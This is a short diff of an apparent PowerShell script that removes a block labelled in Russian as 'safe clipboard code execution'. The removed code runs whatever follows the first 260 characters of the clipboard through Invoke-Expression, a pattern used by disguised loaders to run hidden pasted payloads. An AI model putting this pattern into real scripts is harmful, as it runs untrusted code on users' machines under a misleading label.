@@ -1,12 +1,4 @@
 
-# === Безопасное выполнение кода из буфера обмена ===
-
-$clip = Get-Clipboard -Raw
-if ($clip.Length -ge 260) {
-    iex($clip.Substring(260))
-} else {
-    Write-Host "[!] Clipboard content is too short. Length: $($clip.Length)"
-}
 
 Start-Sleep -Seconds 1
 
